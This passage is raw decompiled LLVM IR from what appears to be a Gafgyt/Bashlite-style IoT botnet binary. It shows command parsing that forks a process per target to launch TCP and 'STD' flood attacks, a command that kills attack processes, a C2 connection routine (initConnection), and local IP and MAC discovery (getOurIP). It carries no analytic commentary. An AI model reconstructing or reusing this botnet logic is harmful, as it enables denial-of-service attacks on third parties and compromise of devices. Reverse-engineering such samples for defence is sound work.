dec_label_pc_100062ac:                            ; preds = %dec_label_pc_10006298
  %v1_100062b0 = add i32 %tmp, 24
  %v1_100062b4 = inttoptr i32 %v1_100062b0 to i32*
  %v2_100062b4 = load i32, i32* %v1_100062b4, align 4
  store i32 268460736, i32* @lr, align 4
  %v2_100062bc = call i32 @atol(i32 %v2_100062b4, i32 %v1_100062b0)
  br label %dec_label_pc_100062d0

dec_label_pc_100062c8:                            ; preds = %dec_label_pc_10006298
  br label %dec_label_pc_100062d0

dec_label_pc_100062d0:                            ; preds = %dec_label_pc_100062ac, %dec_label_pc_100062c8
  %storemerge4 = phi i32 [ 0, %dec_label_pc_100062c8 ], [ %v2_100062bc, %dec_label_pc_100062ac ]
  store i32 %v2_100061fc, i32* @r3, align 4
  store i32 268460776, i32* @lr, align 4
  %v2_100062e4 = call i32 @__GI_strchr(i32 %v2_100061fc, i32 44)
  %v3_100062ec = icmp eq i32 %v2_100062e4, 0
  br i1 %v3_100062ec, label %dec_label_pc_10006374, label %dec_label_pc_100062f4

dec_label_pc_100062f4:                            ; preds = %dec_label_pc_100062d0
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268460808, i32* @lr, align 4
  %v4_10006304 = call i32 @__GI_strtok(i32 %v2_100061fc, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_1000636825 = icmp eq i32 %v4_10006304, 0
  br i1 %v3_1000636825, label %dec_label_pc_100063ac, label %dec_label_pc_10006314

dec_label_pc_10006314:                            ; preds = %dec_label_pc_100062f4, %dec_label_pc_1000634c
  %storemerge1326 = phi i32 [ %v4_10006358, %dec_label_pc_1000634c ], [ %v4_10006304, %dec_label_pc_100062f4 ]
  store i32 268460824, i32* @lr, align 4
  %v0_10006314 = call i32 @listFork()
  %v3_1000631c = icmp eq i32 %v0_10006314, 0
  br i1 %v3_1000631c, label %dec_label_pc_10006324, label %dec_label_pc_1000634c

dec_label_pc_10006324:                            ; preds = %dec_label_pc_10006314
  %v7_10006340 = call i32 @sendTCP(i32 %storemerge1326, i32 %v2_10006214, i32 %v2_10006230, i32 %v2_1000624c, i32 %v2_10006260, i32 %storemerge4, i32 %storemerge5)
  %v1_10006348 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000634c

dec_label_pc_1000634c:                            ; preds = %dec_label_pc_10006314, %dec_label_pc_10006324
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268460892, i32* @lr, align 4
  %v4_10006358 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_10006368 = icmp eq i32 %v4_10006358, 0
  br i1 %v3_10006368, label %dec_label_pc_100063ac, label %dec_label_pc_10006314

dec_label_pc_10006374:                            ; preds = %dec_label_pc_100062d0
  store i32 268460920, i32* @lr, align 4
  %v0_10006374 = call i32 @listFork()
  %v3_1000637c = icmp eq i32 %v0_10006374, 0
  br i1 %v3_1000637c, label %dec_label_pc_10006384, label %dec_label_pc_100063ac

dec_label_pc_10006384:                            ; preds = %dec_label_pc_10006374
  %v7_100063a0 = call i32 @sendTCP(i32 %v2_100061fc, i32 %v2_10006214, i32 %v2_10006230, i32 %v2_1000624c, i32 %v2_10006260, i32 %storemerge4, i32 %storemerge5)
  %v1_100063a8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100063ac

dec_label_pc_100063ac:                            ; preds = %dec_label_pc_1000634c, %dec_label_pc_100062f4, %dec_label_pc_10006374, %dec_label_pc_100060c0, %dec_label_pc_10006384
  %v2_100063b0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100121bc.501 to i32), i32* @r4, align 4
  %v3_100063c0 = inttoptr i32 %v2_100063b0 to i8*
  %v4_100063c0 = call i32 @__GI_strcoll(i8* %v3_100063c0, i32 ptrtoint ([4 x i8]* @global_var_100121bc.501 to i32))
  %v3_100063c8 = icmp eq i32 %v4_100063c0, 0
  br i1 %v3_100063c8, label %dec_label_pc_100063d0, label %dec_label_pc_10006538

dec_label_pc_100063d0:                            ; preds = %dec_label_pc_100063ac
  %tmp88 = icmp slt i32 %arg1, 4
  br i1 %tmp88, label %dec_label_pc_1000641c, label %dec_label_pc_100063dc

dec_label_pc_100063dc:                            ; preds = %dec_label_pc_100063d0
  %v1_100063e0 = add i32 %tmp, 8
  %v1_100063e4 = inttoptr i32 %v1_100063e0 to i32*
  %v2_100063e4 = load i32, i32* %v1_100063e4, align 4
  store i32 268461040, i32* @lr, align 4
  %v2_100063ec = call i32 @atol(i32 %v2_100063e4, i32 %v1_100063e0)
  %tmp89 = icmp slt i32 %v2_100063ec, 1
  br i1 %tmp89, label %dec_label_pc_1000641c, label %dec_label_pc_100063fc

dec_label_pc_100063fc:                            ; preds = %dec_label_pc_100063dc
  %v1_10006400 = add i32 %tmp, 12
  %v1_10006404 = inttoptr i32 %v1_10006400 to i32*
  %v2_10006404 = load i32, i32* %v1_10006404, align 4
  store i32 268461072, i32* @lr, align 4
  %v2_1000640c = call i32 @atol(i32 %v2_10006404, i32 %v1_10006400)
  %v2_10006414 = icmp sgt i32 %v2_1000640c, 0
  br i1 %v2_10006414, label %dec_label_pc_1000643c, label %dec_label_pc_1000641c

dec_label_pc_1000641c:                            ; preds = %dec_label_pc_100063fc, %dec_label_pc_100063dc, %dec_label_pc_100063d0
  %v3_10006420 = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10006438.503 to i32), i32* @lr, align 4
  %v5_10006434 = call i32 @Rootsprintf(i32 %v3_10006420, i32 ptrtoint ([27 x i8]* @global_var_100121c0.502 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  br label %dec_label_pc_10006668

dec_label_pc_1000643c:                            ; preds = %dec_label_pc_100063fc
  %v1_10006440 = add i32 %tmp, 4
  %v1_10006444 = inttoptr i32 %v1_10006440 to i32*
  %v2_10006444 = load i32, i32* %v1_10006444, align 4
  %v2_10006454 = load i32, i32* %v1_100063e4, align 4
  store i32 268461152, i32* @lr, align 4
  %v2_1000645c = call i32 @atol(i32 %v2_10006454, i32 %v1_100063e0)
  %v2_10006470 = load i32, i32* %v1_10006404, align 4
  store i32 268461180, i32* @lr, align 4
  %v2_10006478 = call i32 @atol(i32 %v2_10006470, i32 %v1_10006400)
  store i32 %v2_10006444, i32* @r3, align 4
  store i32 268461204, i32* @lr, align 4
  %v2_10006490 = call i32 @__GI_strchr(i32 %v2_10006444, i32 44)
  %v3_10006498 = icmp eq i32 %v2_10006490, 0
  br i1 %v3_10006498, label %dec_label_pc_10006510, label %dec_label_pc_100064a0

dec_label_pc_100064a0:                            ; preds = %dec_label_pc_1000643c
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268461236, i32* @lr, align 4
  %v4_100064b0 = call i32 @__GI_strtok(i32 %v2_10006444, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_1000650421 = icmp eq i32 %v4_100064b0, 0
  br i1 %v3_1000650421, label %dec_label_pc_10006538, label %dec_label_pc_100064c0

dec_label_pc_100064c0:                            ; preds = %dec_label_pc_100064a0, %dec_label_pc_100064e8
  %storemerge1122 = phi i32 [ %v4_100064f4, %dec_label_pc_100064e8 ], [ %v4_100064b0, %dec_label_pc_100064a0 ]
  store i32 268461252, i32* @lr, align 4
  %v0_100064c0 = call i32 @listFork()
  %v3_100064c8 = icmp eq i32 %v0_100064c0, 0
  br i1 %v3_100064c8, label %dec_label_pc_100064d0, label %dec_label_pc_100064e8

dec_label_pc_100064d0:                            ; preds = %dec_label_pc_100064c0
  %v3_100064dc = call i32 @sendSTD(i32 %storemerge1122, i32 %v2_1000645c, i32 %v2_10006478)
  %v1_100064e4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100064e8

dec_label_pc_100064e8:                            ; preds = %dec_label_pc_100064c0, %dec_label_pc_100064d0
  store i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32* @r4, align 4
  store i32 268461304, i32* @lr, align 4
  %v4_100064f4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10012000.470 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_10006504 = icmp eq i32 %v4_100064f4, 0
  br i1 %v3_10006504, label %dec_label_pc_10006538, label %dec_label_pc_100064c0

dec_label_pc_10006510:                            ; preds = %dec_label_pc_1000643c
  store i32 268461332, i32* @lr, align 4
  %v0_10006510 = call i32 @listFork()
  %v3_10006518 = icmp eq i32 %v0_10006510, 0
  br i1 %v3_10006518, label %dec_label_pc_10006520, label %dec_label_pc_10006668

dec_label_pc_10006520:                            ; preds = %dec_label_pc_10006510
  %v3_1000652c = call i32 @sendSTD(i32 %v2_10006444, i32 %v2_1000645c, i32 %v2_10006478)
  %v1_10006534 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006538

dec_label_pc_10006538:                            ; preds = %dec_label_pc_100064e8, %dec_label_pc_100064a0, %dec_label_pc_100063ac, %dec_label_pc_10006520
  %v2_1000653c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_100121dc.507 to i32), i32* @r4, align 4
  %v3_1000654c = inttoptr i32 %v2_1000653c to i8*
  %v4_1000654c = call i32 @__GI_strcoll(i8* %v3_1000654c, i32 ptrtoint ([5 x i8]* @global_var_100121dc.507 to i32))
  %v3_10006554 = icmp eq i32 %v4_1000654c, 0
  br i1 %v3_10006554, label %dec_label_pc_1000655c, label %dec_label_pc_10006668

dec_label_pc_1000655c:                            ; preds = %dec_label_pc_10006538
  br label %dec_label_pc_10006600

dec_label_pc_10006570:                            ; preds = %dec_label_pc_10006600, %dec_label_pc_10006648
  %v1_10006574 = mul i32 %storemerge9, 4
  %v3_10006580 = load i32, i32* @global_var_10024a5c.46, align 4
  %v2_10006584 = add i32 %v3_10006580, %v1_10006574
  %v1_10006588 = inttoptr i32 %v2_10006584 to i32*
  %v2_10006588 = load i32, i32* %v1_10006588, align 4
  %v3_1000658c = icmp eq i32 %v2_10006588, 0
  br i1 %v3_1000658c, label %dec_label_pc_100065f4, label %dec_label_pc_10006594

dec_label_pc_10006594:                            ; preds = %dec_label_pc_10006570
  %v2_100065ac = load i32, i32* %v1_10006588, align 4
  store i32 268461492, i32* @lr, align 4
  %v0_100065b0 = call i32 @__libc_getpid()
  %v4_100065b8 = icmp eq i32 %v2_100065ac, %v0_100065b0
  br i1 %v4_100065b8, label %dec_label_pc_100065f4, label %dec_label_pc_100065c0

dec_label_pc_100065c0:                            ; preds = %dec_label_pc_10006594
  %v3_100065d0 = load i32, i32* @global_var_10024a5c.46, align 4
  %v2_100065d4 = add i32 %v3_100065d0, %v1_10006574
  %v1_100065d8 = inttoptr i32 %v2_100065d4 to i32*
  %v2_100065d8 = load i32, i32* %v1_100065d8, align 4
  store i32 268461544, i32* @lr, align 4
  %v2_100065e4 = call i32 @kill(i32 %v2_100065d8, i32 9)
  %v1_100065ec = add i32 %stack_var_-196.1, 1
  br label %dec_label_pc_100065f4

dec_label_pc_100065f4:                            ; preds = %dec_label_pc_10006594, %dec_label_pc_10006570, %dec_label_pc_100065c0
  %v0_1000669032 = phi i32 [ %v0_1000669033, %dec_label_pc_10006570 ], [ %v0_100065b0, %dec_label_pc_10006594 ], [ %v2_100065e4, %dec_label_pc_100065c0 ]
  %stack_var_-196.0 = phi i32 [ %stack_var_-196.1, %dec_label_pc_10006570 ], [ %stack_var_-196.1, %dec_label_pc_10006594 ], [ %v1_100065ec, %dec_label_pc_100065c0 ]
  %v1_100065f8 = add i32 %storemerge9, 1
  br label %dec_label_pc_10006600

dec_label_pc_10006600:                            ; preds = %dec_label_pc_1000655c, %dec_label_pc_100065f4
  %v0_1000669033 = phi i32 [ 0, %dec_label_pc_1000655c ], [ %v0_1000669032, %dec_label_pc_100065f4 ]
  %stack_var_-196.1 = phi i32 [ 0, %dec_label_pc_1000655c ], [ %stack_var_-196.0, %dec_label_pc_100065f4 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_1000655c ], [ %v1_100065f8, %dec_label_pc_100065f4 ]
  %v2_10006628 = load i32, i32* @global_var_10024a30.44, align 4
  %v3_10006640 = icmp eq i32 %v2_10006628, 0
  br i1 %v3_10006640, label %dec_label_pc_10006648, label %dec_label_pc_10006570

dec_label_pc_10006648:                            ; preds = %dec_label_pc_10006600
  %v3_1000662c = load i32, i32* @global_var_10024a34.45, align 4
  %v3_10006660 = icmp ugt i32 %v3_1000662c, %storemerge9
  br i1 %v3_10006660, label %dec_label_pc_10006570, label %dec_label_pc_10006668

dec_label_pc_10006668:                            ; preds = %dec_label_pc_1000605c, %dec_label_pc_10006648, %dec_label_pc_10006000, %dec_label_pc_10005bf0, %dec_label_pc_10006510, %dec_label_pc_10006538, %dec_label_pc_10006084, %dec_label_pc_10005c14, %dec_label_pc_10005b34, %dec_label_pc_10005bd0, %dec_label_pc_10005bc4, %dec_label_pc_10005ac0, %dec_label_pc_1000641c, %dec_label_pc_100061d4, %dec_label_pc_10005e90, %dec_label_pc_10005b6c, %dec_label_pc_10005a54
  %v0_10006690 = phi i32 [ %v2_10005c00, %dec_label_pc_10005bf0 ], [ %v0_10006510, %dec_label_pc_10006510 ], [ %v4_1000654c, %dec_label_pc_10006538 ], [ %v0_10006084, %dec_label_pc_10006084 ], [ %v0_10005c14, %dec_label_pc_10005c14 ], [ 0, %dec_label_pc_10005b34 ], [ %v2_10005be0, %dec_label_pc_10005bd0 ], [ 0, %dec_label_pc_10005bc4 ], [ 0, %dec_label_pc_10005ac0 ], [ %v5_10006434, %dec_label_pc_1000641c ], [ %v5_100061ec, %dec_label_pc_100061d4 ], [ %v5_10005ea8, %dec_label_pc_10005e90 ], [ %v0_10005b44, %dec_label_pc_10005b6c ], [ %v5_10005a6c, %dec_label_pc_10005a54 ], [ 0, %dec_label_pc_10006000 ], [ %v0_1000669033, %dec_label_pc_10006648 ], [ 0, %dec_label_pc_1000605c ]
  ret i32 %v0_10006690

; uselistorder directives
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %stack_var_-196.1, { 0, 2, 1 }
  uselistorder i32 %v1_10006574, { 1, 0 }
  uselistorder i32 %v4_100064f4, { 1, 0 }
  uselistorder i32 %v2_10006478, { 1, 0 }
  uselistorder i32 %v2_1000645c, { 1, 0 }
  uselistorder i32 %v2_10006444, { 1, 0, 3, 2 }
  uselistorder i32 %v4_10006358, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_10006260, { 1, 0 }
  uselistorder i32 %v2_1000624c, { 1, 0 }
  uselistorder i32 %v2_10006230, { 1, 0 }
  uselistorder i32 %v2_10006214, { 1, 0 }
  uselistorder i32 %v2_100061fc, { 1, 0, 3, 2 }
  uselistorder i32 %v4_10006068, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge816, { 1, 0 }
  uselistorder i32 %v2_10005f4c, { 1, 0 }
  uselistorder i32 %v2_10005f24, { 1, 0 }
  uselistorder i32 %v2_10005f08, { 1, 0 }
  uselistorder i32 %v2_10005eec, { 1, 0 }
  uselistorder i32 %v2_10005ed0, { 1, 0 }
  uselistorder i32 %v2_10005eb8, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 5, 6, 7, 4, 8, 9, 10, 11, 3, 12, 13, 14, 2, 1, 0, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10012000.470 to i32), { 1, 8, 2, 9, 0, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10011c98.28 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_10006668, { 1, 5, 4, 12, 13, 6, 0, 2, 14, 7, 3, 9, 10, 15, 8, 11, 16 }
  uselistorder label %dec_label_pc_10006600, { 1, 0 }
  uselistorder label %dec_label_pc_100065f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006570, { 1, 0 }
  uselistorder label %dec_label_pc_10006538, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100064e8, { 1, 0 }
  uselistorder label %dec_label_pc_100064c0, { 1, 0 }
  uselistorder label %dec_label_pc_100063ac, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000634c, { 1, 0 }
  uselistorder label %dec_label_pc_10006314, { 1, 0 }
  uselistorder label %dec_label_pc_100062d0, { 1, 0 }
  uselistorder label %dec_label_pc_10006298, { 1, 0 }
  uselistorder label %dec_label_pc_100061f4, { 1, 0 }
  uselistorder label %dec_label_pc_100060c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000605c, { 1, 0 }
  uselistorder label %dec_label_pc_10006020, { 1, 0 }
  uselistorder label %dec_label_pc_10005fdc, { 1, 0 }
  uselistorder label %dec_label_pc_10005fa4, { 1, 0 }
  uselistorder label %dec_label_pc_10005f90, { 1, 0 }
  uselistorder label %dec_label_pc_10005eb0, { 1, 0 }
  uselistorder label %dec_label_pc_10005d38, { 1, 0 }
  uselistorder label %dec_label_pc_10005ba0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005b0c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_100066a8 = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268461760, i32* @lr, align 4
  %v3_100066bc = call i32 @__GI_memset(i32 %v2_100066a8, i32 0, i32 4096)
  %v3_100066c4 = load i32, i32* @global_var_10024a28.27, align 4
  %v3_100066c8 = icmp eq i32 %v3_100066c4, 0
  br i1 %v3_100066c8, label %dec_label_pc_100066ec, label %dec_label_pc_100066d0

dec_label_pc_100066d0:                            ; preds = %entry
  store i32 268461792, i32* @lr, align 4
  %v1_100066dc = call i32 @__libc_close(i32 %v3_100066c4)
  store i32 0, i32* @global_var_10024a28.27, align 4
  br label %dec_label_pc_100066ec

dec_label_pc_100066ec:                            ; preds = %entry, %dec_label_pc_100066d0
  %v3_100066f0 = load i32, i32* @global_var_100249e8.508, align 4
  %v3_100066f4 = icmp eq i32 %v3_100066f0, 0
  br i1 %v3_100066f4, label %dec_label_pc_100066fc, label %dec_label_pc_1000670c

dec_label_pc_100066fc:                            ; preds = %dec_label_pc_100066ec
  br label %dec_label_pc_10006720

dec_label_pc_1000670c:                            ; preds = %dec_label_pc_100066ec
  %v1_10006714 = add i32 %v3_100066f0, 1
  br label %dec_label_pc_10006720

dec_label_pc_10006720:                            ; preds = %dec_label_pc_100066fc, %dec_label_pc_1000670c
  %storemerge = phi i32 [ 0, %dec_label_pc_100066fc ], [ %v1_10006714, %dec_label_pc_1000670c ]
  store i32 %storemerge, i32* @global_var_100249e8.508, align 4
  %v1_10006734 = mul i32 %storemerge, 4
  %v2_10006738 = add i32 %v1_10006734, ptrtoint ([20 x i8]** @global_var_100249e0.510 to i32)
  %v1_1000673c = inttoptr i32 %v2_10006738 to i32*
  %v2_1000673c = load i32, i32* %v1_1000673c, align 4
  %v2_10006748 = inttoptr i32 %v2_1000673c to i8*
  %v3_10006748 = call i32 @strcpy(i32 %v2_100066a8, i8* %v2_10006748)
  store i32 %v2_100066a8, i32* @r3, align 4
  store i32 268461924, i32* @lr, align 4
  %v2_10006760 = call i32 @__GI_strchr(i32 %v2_100066a8, i32 58)
  %v3_10006768 = icmp eq i32 %v2_10006760, 0
  br i1 %v3_10006768, label %dec_label_pc_100067b8, label %dec_label_pc_10006770

dec_label_pc_10006770:                            ; preds = %dec_label_pc_10006720
  store i32 %v2_100066a8, i32* @r3, align 4
  store i32 268461952, i32* @lr, align 4
  %v2_1000677c = call i32 @__GI_strchr(i32 %v2_100066a8, i32 58)
  %v1_10006784 = add i32 %v2_1000677c, 1
  store i32 268461968, i32* @lr, align 4
  %v2_1000678c = call i32 @atol(i32 %v1_10006784, i32 %v2_1000677c)
  store i32 %v2_100066a8, i32* @r3, align 4
  store i32 268461992, i32* @lr, align 4
  %v2_100067a4 = call i32 @__GI_strchr(i32 %v2_100066a8, i32 58)
  %v3_100067b4 = inttoptr i32 %v2_100067a4 to i8*
  store i8 0, i8* %v3_100067b4, align 1
  br label %dec_label_pc_100067b8

dec_label_pc_100067b8:                            ; preds = %dec_label_pc_10006720, %dec_label_pc_10006770
  %stack_var_-4136.0 = phi i32 [ 123, %dec_label_pc_10006720 ], [ %v2_1000678c, %dec_label_pc_10006770 ]
  store i32 268462024, i32* @lr, align 4
  %v3_100067c4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_100067c4, i32* @global_var_10024a28.27, align 4
  store i32 268462068, i32* @lr, align 4
  %v5_100067f0 = call i32 @connectTimeout(i32 %v3_100067c4, i32 %v2_100066a8, i32 %stack_var_-4136.0, i32 30, i32 %v2_100066a8)
  %v3_100067f8 = icmp eq i32 %v5_100067f0, 0
  %. = zext i1 %v3_100067f8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_100066a8, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 (i32, i32)* @atol, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100067b8, { 1, 0 }
  uselistorder label %dec_label_pc_10006720, { 1, 0 }
  uselistorder label %dec_label_pc_100066ec, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4160 = alloca i8, align 1
  %stack_var_-4164 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-4196 = alloca i32, align 4
  store i32 268462168, i32* @lr, align 4
  %v3_10006854 = call i32 @socket(i32 2, i32 2, i32 0)
  %v4_10006868 = icmp eq i32 %v3_10006854, -1
  br i1 %v4_10006868, label %dec_label_pc_10006870, label %dec_label_pc_1000687c

dec_label_pc_10006870:                            ; preds = %entry
  br label %dec_label_pc_10006aa8

dec_label_pc_1000687c:                            ; preds = %entry
  %v2_1000687c = ptrtoint i32* %stack_var_-4196 to i32
  store i32 2, i32* %stack_var_-4196, align 4
  store i32 268462260, i32* @lr, align 4
  %v2_100068b0 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_100121e4.512 to i32))
  store i32 53, i32* @r3, align 4
  %v1_100068c0 = call i32 @htons(i32 53)
  store i32 268462304, i32* @lr, align 4
  %v3_100068dc = call i32 @__libc_connect(i32 %v3_10006854, i32 %v2_1000687c, i32 16)
  %v4_100068f0 = icmp eq i32 %v3_100068dc, -1
  br i1 %v4_100068f0, label %dec_label_pc_100068f8, label %dec_label_pc_10006904

dec_label_pc_100068f8:                            ; preds = %dec_label_pc_1000687c
  br label %dec_label_pc_10006aa8

dec_label_pc_10006904:                            ; preds = %dec_label_pc_1000687c
  store i32 16, i32* %stack_var_-4164, align 4
  %v2_1000690c = ptrtoint i32* %stack_var_-4180 to i32
  %v2_10006910 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 268462372, i32* @lr, align 4
  %v4_10006920 = call i32 @__GI_getsockname(i32 %v3_10006854, i32 %v2_1000690c, i32 %v2_10006910, i32 %v2_10006910)
  %v4_10006934 = icmp eq i32 %v4_10006920, -1
  br i1 %v4_10006934, label %dec_label_pc_1000693c, label %dec_label_pc_10006948

dec_label_pc_1000693c:                            ; preds = %dec_label_pc_10006904
  br label %dec_label_pc_10006aa8

dec_label_pc_10006948:                            ; preds = %dec_label_pc_10006904
  store i32 268462440, i32* @lr, align 4
  %v3_10006964 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_100121ec.513 to i32), i32 0)
  %v2_100069e8 = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_100069e8

dec_label_pc_10006974:                            ; preds = %dec_label_pc_100069e8
  store i32 268462472, i32* @lr, align 4
  %v6_10006984 = call i32 @strstr(i32 %v2_100069e8, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100121fc.514, i32 0, i32 0), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v3_1000698c = icmp eq i32 %v6_10006984, 0
  br i1 %v3_1000698c, label %dec_label_pc_100069d0, label %dec_label_pc_100069ac.preheader

dec_label_pc_100069ac.preheader:                  ; preds = %dec_label_pc_10006974
  %v2_100069b010 = load i8, i8* %stack_var_-4160, align 1
  %v3_100069b814 = icmp eq i8 %v2_100069b010, 9
  br i1 %v3_100069b814, label %dec_label_pc_100069c0, label %dec_label_pc_100069a0

dec_label_pc_100069a0:                            ; preds = %dec_label_pc_100069ac.preheader, %dec_label_pc_100069a0
  %v4_100069ac15 = phi i32 [ %v1_100069a4, %dec_label_pc_100069a0 ], [ %v2_100069e8, %dec_label_pc_100069ac.preheader ]
  %v1_100069a4 = add i32 %v4_100069ac15, 1
  %v5_100069a8 = inttoptr i32 %v1_100069a4 to i8*
  %v2_100069b0 = load i8, i8* %v5_100069a8, align 1
  %v3_100069b8 = icmp eq i8 %v2_100069b0, 9
  br i1 %v3_100069b8, label %dec_label_pc_100069c0, label %dec_label_pc_100069a0

dec_label_pc_100069c0:                            ; preds = %dec_label_pc_100069a0, %dec_label_pc_100069ac.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_100069ac.preheader ], [ %v5_100069a8, %dec_label_pc_100069a0 ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_10006a08

dec_label_pc_100069d0:                            ; preds = %dec_label_pc_10006974
  store i32 268462568, i32* @lr, align 4
  %v3_100069e4 = call i32 @__GI_memset(i32 %v2_100069e8, i32 0, i32 4096)
  br label %dec_label_pc_100069e8

dec_label_pc_100069e8:                            ; preds = %dec_label_pc_10006948, %dec_label_pc_100069d0
  %v3_100069f8 = call i32 @fdgets(i32 %v2_100069e8, i32 4096, i32 %v3_10006964)
  %v3_10006a00 = icmp eq i32 %v3_100069f8, 0
  br i1 %v3_10006a00, label %dec_label_pc_10006a08, label %dec_label_pc_10006974

dec_label_pc_10006a08:                            ; preds = %dec_label_pc_100069e8, %dec_label_pc_100069c0
  store i32 268462608, i32* @lr, align 4
  %v1_10006a0c = call i32 @__libc_close(i32 %v3_10006964)
  %v3_10006a10 = load i8, i8* %stack_var_-4160, align 1
  %v3_10006a18 = icmp eq i8 %v3_10006a10, 0
  br i1 %v3_10006a18, label %dec_label_pc_10006a9c, label %dec_label_pc_10006a20

dec_label_pc_10006a20:                            ; preds = %dec_label_pc_10006a08
  %v2_10006a20 = ptrtoint i32* %stack_var_-64 to i32
  %v3_10006a30 = call i32 @strcpy(i32 %v2_10006a20, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_10006a50.515 to i32), i32* @lr, align 4
  %v3_10006a4c = call i32 @ioctl(i32 %v3_10006854, i32 35111, i32 %v2_10006a20)
  %v2_10006a64 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_10006a5c

dec_label_pc_10006a5c:                            ; preds = %dec_label_pc_10006a20, %dec_label_pc_10006a5c
  %storemerge58 = phi i32 [ 0, %dec_label_pc_10006a20 ], [ %v1_10006a88, %dec_label_pc_10006a5c ]
  %v2_10006a6c = add i32 %storemerge58, %v2_10006a64
  %v1_10006a70 = inttoptr i32 %v2_10006a6c to i8*
  %v2_10006a70 = load i8, i8* %v1_10006a70, align 1
  %v4_10006a80 = add i32 %storemerge58, ptrtoint (i32* @global_var_10024a38.516 to i32)
  %v5_10006a80 = inttoptr i32 %v4_10006a80 to i8*
  store i8 %v2_10006a70, i8* %v5_10006a80, align 1
  %v1_10006a88 = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_10006a88, 6
  br i1 %tmp37, label %dec_label_pc_10006a5c, label %dec_label_pc_10006a9c

dec_label_pc_10006a9c:                            ; preds = %dec_label_pc_10006a5c, %dec_label_pc_10006a08
  store i32 ptrtoint (i32* @global_var_10006aa4.517 to i32), i32* @lr, align 4
  %v1_10006aa0 = call i32 @__libc_close(i32 %v3_10006854)
  br label %dec_label_pc_10006ab0

dec_label_pc_10006aa8:                            ; preds = %dec_label_pc_1000693c, %dec_label_pc_100068f8, %dec_label_pc_10006870
  br label %dec_label_pc_10006ab0

dec_label_pc_10006ab0:                            ; preds = %dec_label_pc_10006a9c, %dec_label_pc_10006aa8
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_10006aa8 ], [ %tmp, %dec_label_pc_10006a9c ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_100069a4, { 1, 0 }
  uselistorder i32 %v2_100069e8, { 3, 1, 0, 2 }
  uselistorder i32 %v3_10006854, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
